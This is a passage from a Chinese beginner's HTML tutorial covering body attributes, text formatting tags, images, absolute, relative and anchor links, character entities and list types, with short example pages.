<tbody><tr>
<td align="left"><code>&lt;body&gt;内容&lt;/body&gt;</code></td>
<td align="left">定义文档的主体</td>
<td align="left">alink：规定文档中活动链接（active link）的的颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>background URL：规定文档的背景图。<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>bgcolor：规定文档的背景颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>link：规定文档中未访问链接的默认颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>text：规定文档中所有文本的颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>vlink：规定文档中已被访问链接的颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。</td>
</tr>
</tbody></table>
<p><strong><code>&lt;body&gt;</code>的常用属性</strong></p>
<p>bgColor：网页背景色。如：<code>&lt;body  bgColor = “red”&gt;</code></p>
<p>background：网页背景图片地址。如：<code>&lt;body  background = “images/01.jpg”&gt;</code></p>
<br>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;demook.hhh&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1593.png&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;Nice优秀啊....&lt;/h1&gt;</span><br><span class="line">       &lt;h2&gt;是的呢 ヾ(๑╹◡╹)ﾉ<span class="string">&quot; &lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c8246bcd4f93.png" alt="5.png"></p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>3. 文本修饰标签</strong></font></p>
<table>
<thead>
<tr>
<th align="left">用法</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>&lt;b&gt;&lt;/b&gt;</code></strong></td>
<td align="left">加粗字体。如：<code>&lt;b&gt;HTML文件&lt;/b&gt;</code> ----&gt; <b>HTML文件</b></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;i&gt;&lt;/i&gt;</code></strong></td>
<td align="left">斜体italic。如：<code>&lt;i&gt;HTML文本&lt;/i&gt;</code>----&gt; <i>HTML文本</i></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;u&gt;&lt;/u&gt;</code></strong></td>
<td align="left">下划线underline。如：<code>&lt;u&gt;HTML文本&lt;/u&gt;</code>----&gt; <u>HTML文本</u></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;s&gt;&lt;/s&gt;</code></strong></td>
<td align="left">删除线strike。如：<code>&lt;s&gt;删除线&lt;/s&gt;</code>----&gt; <s>删除线</s></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong></td>
<td align="left">上标，如：<code>3&lt;sup&gt;x&lt;/sup&gt;</code> ----&gt; 3<sup>x</sup></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong></td>
<td align="left">下标，如：<code>6&lt;sub&gt;5&lt;/sub&gt;</code> ----&gt; 6<sub>5</sub></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;font&gt;&lt;/font&gt;</code></strong></td>
<td align="left">字体标记，如：<code>&lt;font size=&quot;4&quot; color=&quot;red&quot; face=&quot;Comic sans MS&quot;&gt;Demo&lt;/font&gt;</code><font size="4" color="red" face="Comic sans MS">Demo</font></td>
</tr>
<tr>
<td align="left"><strong><code>size</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。文本大小，取值1-7（1小，7大）</td>
</tr>
<tr>
<td align="left"><strong><code>color</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。颜色值</td>
</tr>
<tr>
<td align="left"><strong><code>face</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。字体，楷体、黑体、宋体</td>
</tr>
</tbody></table>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>4. <code>&lt;p&gt;&lt;/p&gt;</code>表示一个段落</strong></font></p>
<p>属性及取值如下：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">align</td>
<td align="left">left<br>right<br>center<br>justify</td>
<td align="left">HTML5不支持。 HTML 4.01已废弃。 <br>不赞成使用。请使用样式取代它。 规定段落中文</td>
</tr>
</tbody></table>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>5. <code>&lt;br&gt;</code> 标签</strong></font></p>
<p><code>&lt;br&gt;</code> 标签插入一个简单的换行符。<code>&lt;br&gt;</code> 标签是一个空标签，意味着它没有结束</p>
<p><strong>提示：</strong>在<font color="#FF7F00"><strong>写地址信息或者写诗词时 <code>&lt;br&gt;</code> 标签非常有用</strong></font>。</p>
<p><strong>注释：</strong> 请<font color="#FF7F00"><strong>使用 <code>&lt;br&gt;</code> 标签来输入空行，而不是分割段落</strong></font>。</p>
<p>在 HTML 中，<code>&lt;br&gt;</code> 标签没有结束标签。</p>
<p>在 XHTML 中，<code>&lt;br&gt;</code> 标签必须被正确地关闭，比如这样：<code>&lt;br /&gt;</code> 。</p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>6. <code>&lt;hr&gt;</code> 标签</strong></font></p>
<p><img data-src="https://i.loli.net/2019/03/08/5c82523cb9d72.png" alt="6.png"></p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>7. <code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong></font></p>
<p><strong><code>&lt;pre&gt;</code>预排版标记</strong></p>
<p>功能：将保留所有的空白字符(空格、换行符)，换句话说：就是原封不动输出。<br>可参读：<font color="#00B2EE">《<a href="https://www.jianshu.com/p/6abc36c28e45">html &lt;.code&gt;&amp;&lt;.pre&gt;</a>》</font> </p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>8. <code>&lt;strong&gt;</code>和 <code>&lt;em&gt;</code></strong></font></p>
<ul>
<li><p>有了段落又有了标题，现在如果想在一段话中特别强调某几个文字，这时候就可以用到<code>&lt;em&gt;</code>或<code>&lt;strong&gt;</code>标签。</p>
</li>
<li><p>但两者在强调的语气上有区别:<code>&lt;em&gt;</code> 表示强调，<code>&lt;strong&gt; </code>表示更强烈的强调。并且在浏览器中<code>&lt;em&gt;</code> 默认用斜体表示，<code>&lt;strong&gt;</code> 用粗体表示。两个标签相比，目前国内前端程序员更喜欢使用<code>&lt;strong&gt;</code>表示强调。</p>
</li>
<li><p><font color="#FF7F00"><strong><code>&lt;em&gt;</code>的内容在浏览中显示为斜体，<code>&lt;strong&gt;</code>显示为加粗</strong></font>。如果不喜欢这种样式，没有关系，以后可以使用css样式去改变它。</p>
</li>
</ul>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>9. <code>&lt;span&gt;&lt;/span&gt;</code>&gt;</strong></font></p>
<ul>
<li><p><code>&lt;span&gt;</code> 标签被用来组合文档中的行内元素。span 没有固定的格式表现。当对它应用样式时，它才会产生视觉上的变化。如果不对 <code>&lt;span&gt;</code> 应用样式，那么 <code>&lt;span&gt;</code> 元素中的文本与其他文本不会任何视觉上的差异。</p>
</li>
<li><p><code>&lt;span&gt;</code> 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。</p>
</li>
<li><p>被 <code>&lt;span&gt;</code> 元素包含的文本，您可以使用 CSS 对它定义样式，或者使用 JavaScript 对它进行操作。</p>
</li>
</ul>
<br>

<br>


<h4 id="2-3-常用标签-链接和图像"><a href="#2-3-常用标签-链接和图像" class="headerlink" title="2.3 常用标签-链接和图像"></a><font color="#3CB371" face="Comic sans MS">2.3 常用标签-链接和图像</font></h4><h5 id="一-image图像"><a href="#一-image图像" class="headerlink" title="一. image图像"></a><font color="#00B2EE" face="Microsoft YaHei">一. image图像</font></h5><p><strong>注：</strong>这是一个单边标签</p>
<p><font color="#00B2EE" face="Microsoft YaHei"></font></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;img&gt;</code></strong> 单边标签，它只包含属性，并且没有闭合标签。<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>必须属性</strong> ↓↓<ul>
<li><input checked="" disabled="" type="checkbox"> **<code>src</code>**：地址。src 指 “source”。源属性的值是图像的 URL 地址。语法：<code>&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;</code></li>
<li><input checked="" disabled="" type="checkbox"> **<code>alt</code>**：图像替代文本，在浏览器无法载入图像时，浏览器将显示这个替代性的文本而不是图像。语法：<code>&lt;img src=&quot;../style/images/boat.gif&quot; alt=&quot;Big Boat&quot;&gt;</code></li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong>可选属性</strong> ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>height</code>**：图像高度，默认单位为像素</li>
<li><input disabled="" type="checkbox"> <strong><code>width</code></strong> ：图像宽度，默认单位为像素</li>
<li><input disabled="" type="checkbox"> <strong><code>ismap</code></strong> ：为图像定义为服务器端图像映射</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p><strong>注：</strong>可以尝试输入其他属性看看效果，想要让图片居中，只能通过CSS。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;p&gt;Life was like a box of chocolates, you never know what you<span class="string">&#x27;re gonna get.（生命就像一盒巧克力，结果往往出人意料。）---《阿甘正传》 </span></span><br><span class="line"><span class="string"> &lt;/p&gt;</span></span><br><span class="line"><span class="string"> &lt;img src=&quot;https://s2.ax1x.com/2019/03/04/kOxQJS.jpg&quot; width=&quot;200&quot;&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c83893d59c1b.png" alt="11.png"></p>
<br>

<h5 id="二-超级链接"><a href="#二-超级链接" class="headerlink" title="二. 超级链接"></a><font color="#00B2EE" face="Microsoft YaHei">二. 超级链接</font></h5><p>请注意<font color="#FF7F00"><strong>超级链接和锚点链接是不一样滴……</strong></font></p>
<p>网站中随处可见超级链接的身影，打开百度新闻，任意点击一段话，就会打开新闻详情页，这全部都是超级链接</p>
<p><strong>语法格式：<code>&lt;a  属性 = “值”&gt;……&lt;/a&gt;</code></strong><br><strong>注：</strong><code>&lt;a&gt;</code>中不能再套<code>&lt;a&gt;</code>标记</p>
<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>1. 标签</strong></font> </p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;a&gt;&lt;/a&gt;</code></strong> 超级链接，中间是文本提示，常用属性:<ul>
<li><input checked="" disabled="" type="checkbox"> **<code>href</code>**：目标文件的地址URL（该URL可以是相对地址，也可以是绝对地址）</li>
<li><input checked="" disabled="" type="checkbox"> **<code>target</code>**：目标文件的显示窗口的方法：<ul>
<li><input disabled="" type="checkbox"> **<code>_blank</code>**：在新窗口中打开目标文件。</li>
<li><input disabled="" type="checkbox"> **<code>_self</code>**：在当前窗口中打开目标文件(默认打开)，相当于“替换”当前页面操作。</li>
<li><input disabled="" type="checkbox"> **<code>_parent</code>**：在父级窗口来打开目标文件。常用框架网页中</li>
<li><input disabled="" type="checkbox"> **<code>_top</code>**：在最顶级窗口来打开目标文件。常用框架网页中</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>2. 绝对地址URL</strong></font> </p>
<p><strong>（1）远程的绝对地址</strong>：直接输入远程绝对路径</p>
<ol>
<li>访问远程的文件，总是以<code>&lt;a href=&quot;http://域名/主机名..&quot;&gt;提示文本&lt;/a&gt;</code><br>  如：<code>&lt;a href=&quot;https://Treecatee.github.io&quot; target=&quot;_blank&quot;&gt;Treecatee.github.io&lt;/a&gt;</code></li>
</ol>
<br>

<p>**（2）本地的绝对地址(很少使用)**：访问本地绝对的路径文件</p>
<ol>
<li>访问本地的绝对地址，是以<code>&lt;a href=&quot;http://file:///开头的绝对地址。&quot;&gt;file:///开头的绝对地址。&lt;/a&gt;</code><br>   如：<code>&lt;a href=&quot;file:///D:/image.html&quot; target=&quot;_blank&quot;&gt;</code></li>
</ol>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;https://treecatee.github.io&quot;</span>  target=<span class="string">&quot;_blank&quot;</span>&gt;远程绝对路径访问，哈哈哈😁&lt;/a&gt; </span><br><span class="line">      &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;a href=<span class="string">&quot;file:///D:/image.html&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;(。・∀・)ノ本地绝对路径访问，不要忘记“/ / /”&lt;/a&gt; </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c8399a12d344.png" alt="12.png"></p>
<p><font face="Microsoft YaHei" color="#20B2AA"><strong>3. 相对地址URL</strong>（项目中路径一般是相对路径）</font> </p>
<p>（1）当前文件和目标文件是<strong>同级关系</strong>，链接地址直接写目标文件名。</p>
<p>（2）当前文件与<strong>目标文件所在的文件夹是同级关系</strong>，先找“文件夹名”，然后再找“文件名”。</p>
<p>（3）目标文件位于<strong>上一层目录中</strong>，往上找对应的目录，再找目录中的文件。</p>
<ol>
<li><strong>注意：</strong><br>1. **<code>./</code>**代表当前目录，默认使用<br>2. **<code>../</code>**代表上一级目录<br>3. **<code>../../</code>**代表上两级目录</li>
</ol>
<br>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;./tina.html&quot;</span>  target=<span class="string">&quot;_blank&quot;</span>&gt;同级目录下的本地相对路径链接，哈哈哈😁&lt;/a&gt; </span><br><span class="line">      &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;a href=<span class="string">&quot;../test/2.html&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;上级目录下的本地相对路径链接 (。・∀・)ノ&lt;/a&gt; </span><br><span class="line">   &lt;a href=<span class="string">&quot;../../dream/hap.mp3&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;上上级目录下的本地相对路径链接 ♪(´▽｀)&lt;/a&gt; </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>4. 特殊的链接</strong></font> </p>
<p>(1) 下载链接</p>
<ol>
<li><p>这些文件网页可以直接执行，如：.jpg、.png、.gif、.html、.htm、.txt等。</p>
</li>
<li><p>大部分文件，浏览器是不能直接执行的。如：.doc、.xls、.ppt、.rar、.psd……</p>
</li>
</ol>
<p>(2) 邮箱链接</p>
<p>(3) 普通空链接（#）如：<code>&lt;a href=&quot;#&quot;&gt;这是一个空链接&lt;/a&gt;</code></p>
<br>

<h5 id="三-锚点链接"><a href="#三-锚点链接" class="headerlink" title="三. 锚点链接"></a><font color="#00B2EE" face="Microsoft YaHei">三. 锚点链接</font></h5><p><strong><code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code></strong> ：定义锚点，做个记号<br><strong><code>&lt;a href=&quot;[文件名]#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code></strong> ：记号，功能是跳到做记号的地方</p>
<p>分为当前页面跳转和跨页面跳转，页内跳转时不用文件名，跨页跳转时用。</p>
<br>

<blockquote>
<ol>
<li>锚点是什么？</li>
<li>为什么要用锚点？</li>
<li>锚点怎么用？</li>
</ol>
</blockquote>
<br>

<ol>
<li><strong>锚点是什么？</strong></li>
</ol>
<p>如我们在做一个很长的网页时，需要在页面内做一个导航，点击导航里的链接不是新开一个窗口或者跳转到其他网址，而是<font color="#FF7F00"><strong>跳转到当前页的某一个位置</strong></font>。那么所要跳转到的那个位置，我们就叫做<font color="#FF7F00"><strong>锚点</strong></font>，它是一种<font color="#FF7F00"><strong>在页面内部定位的方式</strong></font>。</p>
<ol start="2">
<li><strong>为什么要用锚点？</strong></li>
</ol>
<p>在写项目的时候，页面比较长，这时候需要设置锚点进行<font color="#FF7F00"><strong>快速定位</strong></font>到某个段落或某个位置。</p>
<ol start="3">
<li><strong>锚点怎么用？</strong></li>
</ol>
<p>分为当前页面跳转或者跨页面跳转：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>定义锚点</strong>(作个记号)：用于定位的目的地。不管是当前当前页面内还是跨页跳转定义方法都一样；<ul>
<li><input disabled="" type="checkbox"> 定义方法：**<code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code><strong>或</strong><code>&lt;h2 id=&quot;锚点名称&quot;&gt;&lt;/h2&gt;</code>**或…..</li>
<li><input checked="" disabled="" type="checkbox"> 锚点名称命名规则：<ul>
<li><input disabled="" type="checkbox"> 可以包含字母、数字、下划线，但<font color="#FF7F00"><strong>只能以字母开头</strong></font>。</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong>锚点</strong>（触发），也称为记号。<ul>
<li><input disabled="" type="checkbox"> 跳到当前页面定义方法：**<code>&lt;a  href=&quot;#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>**</li>
<li><input disabled="" type="checkbox"> 跨页面跳转定义方法：**<code>&lt;a  href=&quot;目标页面路径#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>**</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>id</code><strong>或</strong><code>name</code>**：定义锚点链接的名称。<ul>
<li><input disabled="" type="checkbox"> name是老方法，id是在name基础上发明的，后来才有的。</li>
<li><input disabled="" type="checkbox"> 使用name属性设置锚点很方便但<font color="#FF7F00"><strong>只能针对a标签来使用</strong></font>，具有一定的局限性。而对div等其他没有name属性的标签就不能起到作用了。</li>
<li><input disabled="" type="checkbox"> id兼容性很好。</li>
</ul>
</li>
</ul>
<br>

<p>示例（页内跳转）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">      &lt;a id=<span class="string">&quot;top&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">            &lt;!--设置锚点，索引功能--&gt;</span><br><span class="line">      &lt;a href=<span class="string">&quot;#a&quot;</span>&gt;点击我就会跳到第一段&lt;/a&gt;  </span><br><span class="line">      &lt;a href=<span class="string">&quot;#b&quot;</span>&gt;点击我就会跳到第二段&lt;/a&gt;</span><br><span class="line">      &lt;a href=<span class="string">&quot;#c&quot;</span>&gt;点击我就会跳到第三段&lt;/a&gt;</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">              &lt;!--做记号--&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;a&quot;</span>&gt;我是标题一&lt;/h2&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;b&quot;</span>&gt;我是标题二&lt;/h2&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;c&quot;</span>&gt;我是标题三&lt;/h2&gt;</span><br><span class="line">  　　</span><br><span class="line">      &lt;a href=<span class="string">&quot;#top&quot;</span>&gt;返回新闻顶部&lt;/a&gt;</span><br><span class="line">　　</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                 </span><br></pre></td></tr></table></figure>

<br>

<p>示例（跨内跳转）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">                &lt;!--设置锚点，索引功能,然后在目的页面做好记号--&gt;</span><br><span class="line">       &lt;a href=<span class="string">&quot;https://treecatee.github.io#a&quot;</span>&gt;点击我就会跳到第一段&lt;/a&gt;  </span><br><span class="line">       &lt;a href=<span class="string">&quot;https://directoree.top#b&quot;</span>&gt;点击我就会跳到第二段&lt;/a&gt;</span><br><span class="line">       &lt;a href=<span class="string">&quot;https://taobao.com#c&quot;</span>&gt;点击我就会跳到第三段&lt;/a&gt;　　</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                 </span><br></pre></td></tr></table></figure>


<br>

<br>


<h4 id="2-4-HTML字符实体"><a href="#2-4-HTML字符实体" class="headerlink" title="2.4 HTML字符实体"></a><font color="#3CB371" face="Comic sans MS">2.4 HTML字符实体</font></h4><br>

<p><font face="Microsoft YaHei"><strong>HTML 中的</strong><font color="#FF7F00"><strong>预留字符</strong></font><strong>必须被替换为</strong><font color="#FF7F00"><strong>字符实体</strong></font>。</font></p>
<br>

<p><font face="Microsoft YaHei"><strong>1. HTML 实体</strong></font></p>
<ol>
<li><p>在 HTML 中，某些字符是预留的。</p>
</li>
<li><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p>
</li>
<li><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p>
</li>
<li><p><strong>注：</strong><font color="#FF7F00"><strong>记得加上半角分号<code>;</code>符号啊，不然识别不出来</strong></font></p>
</li>
</ol>
<br>

<blockquote>
<p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或 <code>&amp;#60;</code><br><strong>提示：</strong>使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p>
</blockquote>
<br>

<p><font face="Microsoft YaHei"><strong>2. 不间断空格（non-breaking space）</strong></font></p>
<ul>
<li><p>HTML 中的常用字符实体是不间断空格(<code>&amp;nbsp;</code>)。</p>
</li>
<li><p>浏览器总是会截短 HTML 页面中的空格。<font color="#FF7F00"><strong>如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个</strong></font>，因此，要使用10个空格的话就需要写10个<code>&amp;nbsp;</code> 。（如需在页面中增加空格的数量，您需要使用 <code>&amp;nbsp;</code> 字符实体）</p>
</li>
</ul>
<br>

<p><font face="Microsoft YaHei"><strong>3. HTML 中有用的字符实体</strong></font></p>
<p><strong>注释：</strong>实体名称对大小写敏感！半角分号不要忘记！<br>如果想要输出<code>&amp;nbsp;</code>而不被转义为空格，可这样：<code>&amp;amp;nbsp;</code>，因为<code>&amp;amp;</code>对应<code>$</code>--&gt;&amp;nbsp;</p>
<table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">实体名称</th>
<th align="left">实体编号</th>
</tr>
</thead>
</table>
<pre><code> |空格    |**`&amp;nbsp;`**     |**`&amp;#160;`**
</code></pre>
<p>&lt;    |小于号    |<strong><code>&amp;lt;</code>**    |<strong><code>&amp;#60;</code></strong><br>&gt;    |大于号    |</strong><code>&amp;gt;</code>**    |<strong><code>&amp;#62;</code></strong><br>&amp;    |和号    |<strong><code>&amp;amp;</code></strong>        |<strong><code>&amp;#38;</code></strong><br>“    |引号    |<strong><code>&amp;quot;</code></strong>        |<strong><code>&amp;#34;</code></strong><br>‘    |撇号     |<strong><code>&amp;apos; </code></strong>(IE不支持)    |<strong><code>&amp;#39;</code></strong><br>￠    |分（cent）    |<strong><code>&amp;cent;</code></strong>    |<strong><code>&amp;#162;</code></strong><br>£    |镑（pound）    |<strong><code>&amp;pound;</code></strong>    |<strong><code>&amp;#163;</code></strong><br>¥    |元（yen）    |<strong><code>&amp;yen;</code></strong>    |<strong><code>&amp;#165;</code></strong><br>€    |欧元（euro）    |<strong><code>&amp;euro;</code></strong>    |<strong><code>&amp;#8364;</code></strong><br>§    |小节    |<strong><code>&amp;sect;</code></strong>    |<strong><code>&amp;#167;</code></strong><br>©    |版权（copyright）    |<strong><code>&amp;copy;</code></strong>    |<strong><code>&amp;#169;</code></strong><br>®    |注册商标    |<strong><code>&amp;reg;</code></strong>    |<strong><code>&amp;#174;</code></strong><br>™    |商标    |<strong><code>&amp;trade;</code></strong>    |<strong><code>&amp;#8482;</code></strong><br>×    |乘号    |<strong><code>&amp;times;</code></strong>    |<strong><code>&amp;#215;</code></strong><br>÷    |除号    |<strong><code>&amp;divide;</code></strong>    |<strong><code>&amp;#247;</code></strong></p>
<p>完整的实体符号参考：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/tags/html_ref_entities.html">HTML ISO-8859-1 参考手册</a>]</font> </p>
<br>

<br>

<h3 id="三-HTML-列表"><a href="#三-HTML-列表" class="headerlink" title="三. HTML 列表"></a><font color="#FF6347" face="Comic sans MS">三. HTML 列表</font></h3><p>列表就是像word里面的标题一样，顺着往下数的标题。</p>
<p>HTML 支持<font color="#FF7F00"><strong>无序列表ul</strong></font>(unordered list）、<font color="#FF7F00"><strong>有序列表ol</strong></font>（ordered list）和<font color="#FF7F00"><strong>自定义列表dl</strong></font>（definition list）</p>
<br>

<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;ul&gt;&lt;/ul&gt;</code></strong> 无序列表<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>type</code></strong> 列表项属性，放在&lt;ul type&#x3D;””&gt;里，取值有：<ul>
<li><input disabled="" type="checkbox"> <strong><code>disc</code></strong> 小黑点</li>
<li><input disabled="" type="checkbox"> <strong><code>circle</code></strong> 空心圆</li>
<li><input disabled="" type="checkbox"> <strong><code>square</code></strong> 实心方块</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;ol&gt;&lt;/ol&gt;</code></strong> 有序列表<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>type</code></strong> 编号类型，放在&lt;ol type&#x3D;””&gt;里，取值有：<ul>
<li><input disabled="" type="checkbox"> <strong><code>1</code></strong> 整数有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>a</code></strong> 字母小写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>A</code></strong> 字母大写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>i</code></strong> 罗马小写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>I</code></strong> 罗马大写有序列表</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>start</code></strong> 从第几个开始编号(数字)，放在&lt;dl type&#x3D;”” start&#x3D;””&gt;里。</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;dl&gt;&lt;/dl&gt;</code></strong> 自定义列表<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;dt&gt;&lt;/dt&gt;</code></strong> 自定义列表项<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;dd&gt;&lt;/dd&gt;</code></strong> 自定义列表项的描述</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p>列表展示如下：</p>
